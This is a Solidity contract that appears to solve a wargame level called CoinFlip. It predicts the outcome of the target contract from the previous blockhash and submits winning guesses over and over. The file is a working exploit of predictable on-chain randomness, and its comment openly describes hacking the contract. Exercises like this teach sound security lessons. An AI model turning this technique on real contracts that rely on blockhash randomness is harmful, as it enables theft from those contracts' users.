// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

/**
	`blockhash` and `block.number` are not random values but predetermined. Use these values
	to create a similar logic function to hack the CoinFlip contract and send calculated guess.
	Use this function repeatedly to get 10 consecutive wins and complete the level.

	Remember to create interface's function as `external`
 */


interface CoinFlip {
    function flip(bool _guessz) external returns (bool);
}

contract CoinFlipper {
    CoinFlip c = CoinFlip(COIN_FLIP_ADDRESS);
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function blockvalue() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (lastHash != blockValue) {
            lastHash = blockValue;
            uint256 coinlip = blockValue.div(FACTOR);
            bool side = coinlip == 1 ? true : false;
            return c.flip(side);
        }

        return false;
    }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}